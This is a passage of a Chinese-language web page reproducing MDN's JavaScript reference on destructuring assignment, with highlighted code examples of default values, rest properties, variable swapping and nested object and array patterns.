<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: &#123; <span class="attr">c</span>: <span class="number">2</span> &#125; &#125;;</span><br><span class="line"><span class="keyword">const</span> &#123; a &#125; = obj; <span class="comment">// a is constant</span></span><br><span class="line"><span class="keyword">let</span> &#123;</span><br><span class="line">  <span class="attr">b</span>: &#123; <span class="attr">c</span>: d &#125;,</span><br><span class="line">&#125; = obj; <span class="comment">// d is re-assignable</span></span><br></pre></td></tr></table></figure>

<p>在赋值模式中，模式不以关键字开头。每个解构属性都被赋值给一个赋值目标——这个赋值目标可以事先用 <code>var</code> 或 <code>let</code> 声明，也可以是另一个对象的属性——一般来说，可以是任何可以出现在赋值表达式左侧的东西。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> numbers = [];</span><br><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line">(&#123; <span class="attr">a</span>: numbers[<span class="number">0</span>], <span class="attr">b</span>: numbers[<span class="number">1</span>] &#125; = obj);</span><br><span class="line"><span class="comment">// The properties `a` and `b` are assigned to properties of `numbers`</span></span><br></pre></td></tr></table></figure>

<p><strong>备注：</strong> 当使用对象文字解构赋值而不带声明时，在赋值语句周围必须添加括号 <code>( ... )</code>。</p>
<p><code>&#123; a, b &#125; = &#123; a: 1, b: 2 &#125;</code> 不是有效的独立语法，因为左侧的 <code>&#123;a, b&#125;</code> 被视为块而不是对象字面量。但是，<code>(&#123; a, b &#125; = &#123; a: 1, b: 2 &#125;)</code> 是有效的，<code>const &#123; a, b &#125; = &#123; a: 1， b: 2 &#125;</code> 也是有效的。</p>
<p>如果你的编码风格不包括尾随分号，则 <code>( ... )</code> 表达式前面需要有一个分号，否则它可能用于执行前一行的函数。</p>
<p>请注意，上述代码在等效的<em>绑定模式</em>中不是有效的语法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> numbers = [];</span><br><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">a</span>: numbers[<span class="number">0</span>], <span class="attr">b</span>: numbers[<span class="number">1</span>] &#125; = obj;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is equivalent to:</span></span><br><span class="line"><span class="comment">//   const numbers[0] = obj.a;</span></span><br><span class="line"><span class="comment">//   const numbers[1] = obj.b;</span></span><br><span class="line"><span class="comment">// Which definitely is not valid.</span></span><br></pre></td></tr></table></figure>

<h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E9%BB%98%E8%AE%A4%E5%80%BC">默认值</a></h3><p>每个解构属性都可以有一个<em>默认值</em>。当属性不存在或值为 <code>undefined</code> 时，将使用默认值。如果属性的值为 <code>null</code>，则不使用它。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [a = <span class="number">1</span>] = []; <span class="comment">// a is 1</span></span><br><span class="line"><span class="keyword">const</span> &#123; b = <span class="number">2</span> &#125; = &#123; <span class="attr">b</span>: <span class="literal">undefined</span> &#125;; <span class="comment">// b is 2</span></span><br><span class="line"><span class="keyword">const</span> &#123; c = <span class="number">2</span> &#125; = &#123; <span class="attr">c</span>: <span class="literal">null</span> &#125;; <span class="comment">// c is null</span></span><br></pre></td></tr></table></figure>

<p>默认值可以是任何表达式。仅在必要时对其进行评估。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; b = <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hey&quot;</span>) &#125; = &#123; <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="comment">// Does not log anything, because `b` is defined and there&#x27;s no need</span></span><br><span class="line"><span class="comment">// to evaluate the default value.</span></span><br></pre></td></tr></table></figure>

<h3 id="剩余属性"><a href="#剩余属性" class="headerlink" title="剩余属性"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E5%89%A9%E4%BD%99%E5%B1%9E%E6%80%A7">剩余属性</a></h3><p>你可以使用剩余属性（<code>...rest</code>）结束解构模式。此模式会将对象或数组的所有剩余属性存储到新的对象或数组中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; a, ...others &#125; = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span> &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(others); <span class="comment">// &#123; b: 2, c: 3 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first, ...others2] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(others2); <span class="comment">// [2, 3]</span></span><br></pre></td></tr></table></figure>

<p>剩余属性必须是模式中的最后一个，并且不能有尾随逗号。</p>
<p>js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const [a, ...b,] = [1, 2, 3];</span><br><span class="line"></span><br><span class="line">// SyntaxError: rest element may not have a trailing comma</span><br><span class="line">// Always consider using rest operator as the last element</span><br></pre></td></tr></table></figure>

<h3 id="使用其他语法解构模式"><a href="#使用其他语法解构模式" class="headerlink" title="使用其他语法解构模式"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%84%E6%A8%A1%E5%BC%8F">使用其他语法解构模式</a></h3><p>在许多语法中，语言为你绑定变量，你也可以使用解构模式。其中包括：</p>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...in"><code>for...in</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...of"><code>for...of</code></a> 循环中的循环变量；</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions">函数</a>参数；</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/try...catch"><code>catch</code></a> 绑定变量。</li>
</ul>
<p>有关特定于数组或对象解构的功能，请参阅下面的各个示例。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E7%A4%BA%E4%BE%8B">示例</a></h2><h3 id="解构数组"><a href="#解构数组" class="headerlink" title="解构数组"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E8%A7%A3%E6%9E%84%E6%95%B0%E7%BB%84">解构数组</a></h3><h4 id="基本变量赋值"><a href="#基本变量赋值" class="headerlink" title="基本变量赋值"></a>基本变量赋值</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = [<span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>, <span class="string">&quot;three&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [red, yellow, green] = foo;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(red); <span class="comment">// &quot;one&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(yellow); <span class="comment">// &quot;two&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(green); <span class="comment">// &quot;three&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="解构比源更多的元素"><a href="#解构比源更多的元素" class="headerlink" title="解构比源更多的元素"></a>解构比源更多的元素</h4><p>在从赋值语句右侧指定的长度为 <em>N</em> 的数组解构的数组中，如果赋值语句左侧指定的变量数量大于 <em>N</em>，则只有前 <em>N</em> 个变量被赋值。其余变量的值将是未定义。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = [<span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [red, yellow, green, blue] = foo;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(red); <span class="comment">// &quot;one&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(yellow); <span class="comment">// &quot;two&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(green); <span class="comment">// undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(blue); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>

<h4 id="交换变量"><a href="#交换变量" class="headerlink" title="交换变量"></a>交换变量</h4><p>可以在一个解构表达式中交换两个变量的值。</p>
<p>没有解构赋值的情况下，交换两个变量需要一个临时变量（或者用低级语言中的<a href="https://en.wikipedia.org/wiki/XOR_swap_algorithm">异或交换技巧</a>）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">[a, b] = [b, a];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">[arr[<span class="number">2</span>], arr[<span class="number">1</span>]] = [arr[<span class="number">1</span>], arr[<span class="number">2</span>]];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr); <span class="comment">// [1, 3, 2]</span></span><br></pre></td></tr></table></figure>

<h4 id="解析一个从函数返回的数组"><a href="#解析一个从函数返回的数组" class="headerlink" title="解析一个从函数返回的数组"></a>解析一个从函数返回的数组</h4><p>从一个函数返回一个数组是十分常见的情况。解构使得处理返回值为数组时更加方便。</p>
<p>在下面例子中，要让 <code>f()</code> 返回值 <code>[1, 2]</code> 作为其输出，可以使用解构在一行内完成解析。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [a, b] = <span class="title function_">f</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<h4 id="忽略某些返回值"><a href="#忽略某些返回值" class="headerlink" title="忽略某些返回值"></a>忽略某些返回值</h4><p>你可以忽略你不感兴趣的返回值：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [a, , b] = <span class="title function_">f</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [c] = <span class="title function_">f</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>你也可以忽略全部返回值：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[, ,] = <span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<h4 id="使用绑定模式作为剩余属性"><a href="#使用绑定模式作为剩余属性" class="headerlink" title="使用绑定模式作为剩余属性"></a>使用绑定模式作为剩余属性</h4><p>数组解构赋值的剩余属性可以是另一个数组或对象绑定模式。这允许你同时提取数组的属性和索引。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b, ...&#123; pop, push &#125;] = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b); <span class="comment">// 1 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pop, push); <span class="comment">// [Function pop] [Function push]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b, ...[c, d]] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c, d); <span class="comment">// 1 2 3 4</span></span><br></pre></td></tr></table></figure>

<p>这些绑定模式甚至可以嵌套，只要每个剩余属性都在列表的最后。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b, ...[c, d, ...[e, f]]] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c, d, e, f); <span class="comment">// 1 2 3 4 5 6</span></span><br></pre></td></tr></table></figure>

<p>另一方面，对象解构只能有一个标识符作为剩余属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; a, ...&#123; b &#125; &#125; = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="comment">// SyntaxError: `...` must be followed by an identifier in declaration contexts</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a, b;</span><br><span class="line">(&#123; a, ...&#123; b &#125; &#125; = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;);</span><br><span class="line"><span class="comment">// SyntaxError: `...` must be followed by an assignable reference in assignment contexts</span></span><br></pre></td></tr></table></figure>

<h4 id="从正则表达式匹配项中提取值"><a href="#从正则表达式匹配项中提取值" class="headerlink" title="从正则表达式匹配项中提取值"></a>从正则表达式匹配项中提取值</h4><p>当正则表达式的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/exec"><code>exec()</code></a> 方法找到匹配项时，它将返回一个数组，该数组首先包含字符串的整个匹配部分，然后返回与正则表达式中每个括号组匹配的字符串部分。解构赋值允许你轻易地提取出需要的部分，如果不需要，则忽略完整匹配。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseProtocol</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> parsedURL = <span class="regexp">/^(\w+):\/\/([^/]+)\/(.*)$/</span>.<span class="title function_">exec</span>(url);</span><br><span class="line">  <span class="keyword">if</span> (!parsedURL) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(parsedURL);</span><br><span class="line">  <span class="comment">// [&quot;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript&quot;,</span></span><br><span class="line">  <span class="comment">// &quot;https&quot;, &quot;developer.mozilla.org&quot;, &quot;zh-CN/docs/Web/JavaScript&quot;]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [, protocol, fullhost, fullpath] = parsedURL;</span><br><span class="line">  <span class="keyword">return</span> protocol;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">  <span class="title function_">parseProtocol</span>(<span class="string">&quot;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript&quot;</span>),</span><br><span class="line">);</span><br><span class="line"><span class="comment">// &quot;https&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="在任何可迭代对象上使用数组解构"><a href="#在任何可迭代对象上使用数组解构" class="headerlink" title="在任何可迭代对象上使用数组解构"></a>在任何可迭代对象上使用数组解构</h4><p>数组解构调用右侧的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols">迭代协议</a>。因此，任何可迭代对象（不一定是数组）都可以解构。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b] = <span class="keyword">new</span> <span class="title class_">Map</span>([</span><br><span class="line">  [<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">  [<span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b); <span class="comment">// [1, 2] [3, 4]</span></span><br></pre></td></tr></table></figure>

<p>不可迭代对象不能解构为数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123; <span class="number">0</span>: <span class="string">&quot;a&quot;</span>, <span class="number">1</span>: <span class="string">&quot;b&quot;</span>, <span class="attr">length</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> [a, b] = obj;</span><br><span class="line"><span class="comment">// TypeError: obj is not iterable</span></span><br></pre></td></tr></table></figure>

<p>只有在分配所有绑定之前，才会迭代可迭代对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  *[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> v <span class="keyword">of</span> [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(v);</span><br><span class="line">      <span class="keyword">yield</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> [a, b] = obj; <span class="comment">// Only logs 0 and 1</span></span><br></pre></td></tr></table></figure>

<p>其余的绑定会提前求值并创建一个新数组，而不是使用旧的迭代器。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  *[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> v <span class="keyword">of</span> [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(v);</span><br><span class="line">      <span class="keyword">yield</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> [a, b, ...rest] = obj; <span class="comment">// Logs 0 1 2 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(rest); <span class="comment">// [2, 3] (an array)</span></span><br></pre></td></tr></table></figure>

<h3 id="解构对象"><a href="#解构对象" class="headerlink" title="解构对象"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment#%E8%A7%A3%E6%9E%84%E5%AF%B9%E8%B1%A1">解构对象</a></h3><h4 id="基本赋值"><a href="#基本赋值" class="headerlink" title="基本赋值"></a>基本赋值</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">42</span>,</span><br><span class="line">  <span class="attr">isVerified</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; id, isVerified &#125; = user;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(id); <span class="comment">// 42</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(isVerified); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h4 id="赋值给新的变量名"><a href="#赋值给新的变量名" class="headerlink" title="赋值给新的变量名"></a>赋值给新的变量名</h4><p>可以从对象中提取属性，并将其赋值给名称与对象属性不同的变量。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> o = &#123; <span class="attr">p</span>: <span class="number">42</span>, <span class="attr">q</span>: <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">p</span>: foo, <span class="attr">q</span>: bar &#125; = o;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo); <span class="comment">// 42</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bar); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>举个例子，<code>const &#123; p: foo &#125; = o</code> 从对象 <code>o</code> 中获取名为 <code>p</code> 的属性，并将其赋值给名为 <code>foo</code> 的局部变量。</p>
<h4 id="赋值到新的变量名并提供默认值"><a href="#赋值到新的变量名并提供默认值" class="headerlink" title="赋值到新的变量名并提供默认值"></a>赋值到新的变量名并提供默认值</h4><p>一个属性可以同时是两者：</p>
<ul>
<li>从对象提取并分配给具有不同名称的变量。</li>
<li>指定一个默认值，以防获取的值为 <code>undefined</code>。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="attr">a</span>: aa = <span class="number">10</span>, <span class="attr">b</span>: bb = <span class="number">5</span> &#125; = &#123; <span class="attr">a</span>: <span class="number">3</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(aa); <span class="comment">// 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bb); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>

<h4 id="从作为函数参数传递的对象中提取属性"><a href="#从作为函数参数传递的对象中提取属性" class="headerlink" title="从作为函数参数传递的对象中提取属性"></a>从作为函数参数传递的对象中提取属性</h4><p>传递给函数参数的对象也可以提取到变量中，然后可以在函数体内访问这些变量。至于对象赋值，解构语法允许新变量具有与原始属性相同或不同的名称，并为原始对象未定义属性的情况分配默认值。</p>
<p>请考虑此对象，其中包含有关用户的信息。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">42</span>,</span><br><span class="line">  <span class="attr">displayName</span>: <span class="string">&quot;jdoe&quot;</span>,</span><br><span class="line">  <span class="attr">fullName</span>: &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&quot;Jane&quot;</span>,</span><br><span class="line">    <span class="attr">lastName</span>: <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在这里，我们展示了如何将传递对象的属性提取到具有相同名称的变量。参数值 <code>&#123; id &#125;</code> 表示传递给函数的对象的 <code>id</code> 属性应该被提取到一个同名变量中，然后可以在函数中使用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">userId</span>(<span class="params">&#123; id &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">userId</span>(user)); <span class="comment">// 42</span></span><br></pre></td></tr></table></figure>

<p>你可以定义提取变量的名称。在这里，我们提取名为 <code>displayName</code> 的属性，并将其重命名为 <code>dname</code>，以便在函数体内使用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">userDisplayName</span>(<span class="params">&#123; displayName: dname &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> dname;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">userDisplayName</span>(user)); <span class="comment">// `jdoe`</span></span><br></pre></td></tr></table></figure>

<p>嵌套对象也可以提取。下面的示例展示了属性 <code>fullname.firstName</code> 被提取到名为 <code>name</code> 的变量中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">whois</span>(<span class="params">&#123; displayName, fullName: &#123; firstName: name &#125; &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;displayName&#125;</span> is <span class="subst">$&#123;name&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">whois</span>(user)); <span class="comment">// &quot;jdoe is Jane&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="设置函数参数的默认值"><a href="#设置函数参数的默认值" class="headerlink" title="设置函数参数的默认值"></a>设置函数参数的默认值</h4><p>默认值可以使用 <code>=</code> 指定，如果指定的属性在传递的对象中不存在，则将其用作变量值。</p>
<p>下面我们展示了一个默认大小为 <code>big</code>的函数，默认坐标为 <code>x: 0, y: 0</code>，默认半径为 25。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">drawChart</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">  size = <span class="string">&quot;big&quot;</span>,</span></span><br><span class="line"><span class="params">  coords = &#123; x: <span class="number">0</span>, y: <span class="number">0</span> &#125;,</span></span><br><span class="line"><span class="params">  radius = <span class="number">25</span>,</span></span><br><span class="line"><span class="params">&#125; = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(size, coords, radius);</span><br><span class="line">  <span class="comment">// do some chart drawing</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">drawChart</span>(&#123;</span><br><span class="line">  <span class="attr">coords</span>: &#123; <span class="attr">x</span>: <span class="number">18</span>, <span class="attr">y</span>: <span class="number">30</span> &#125;,</span><br><span class="line">  <span class="attr">radius</span>: <span class="number">30</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在上面 <code>drawChart</code> 的函数签名中，解构的左侧具有空对象 <code>= &#123;&#125;</code> 的默认值。</p>
<p>你也可以在没有该默认值的情况下编写该函数。但是，如果你省略该默认值，该函数将在调用时寻找至少一个参数来提供，而在当前形式下，你可以在不提供任何参数的情况下调用 <code>drawChart()</code>。否则，你至少需要提供一个空对象字面量。</p>
<p>有关详细信息，请参阅<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Default_parameters#%E6%9C%89%E9%BB%98%E8%AE%A4%E5%80%BC%E7%9A%84%E8%A7%A3%E6%9E%84%E5%8F%82%E6%95%B0">默认参数值 &gt; 有默认值的解构参数</a>。</p>
<h4 id="解构嵌套对象和数组"><a href="#解构嵌套对象和数组" class="headerlink" title="解构嵌套对象和数组"></a>解构嵌套对象和数组</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> metadata = &#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="string">&quot;Scratchpad&quot;</span>,</span><br><span class="line">  <span class="attr">translations</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">locale</span>: <span class="string">&quot;de&quot;</span>,</span><br><span class="line">      <span class="attr">localization_tags</span>: [],</span><br><span class="line">      <span class="attr">last_edit</span>: <span class="string">&quot;2014-04-14T08:43:37&quot;</span>,</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&quot;/de/docs/Tools/Scratchpad&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;JavaScript-Umgebung&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&quot;/zh-CN/docs/Tools/Scratchpad&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;</span><br><span class="line">  <span class="attr">title</span>: englishTitle, <span class="comment">// rename</span></span><br><span class="line">  <span class="attr">translations</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">title</span>: localeTitle, <span class="comment">// rename</span></span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125; = metadata;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(englishTitle); <span class="comment">// &quot;Scratchpad&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(localeTitle); <span class="comment">// &quot;JavaScript-Umgebung&quot;</span></span><br></pre></td></tr></table></figure>

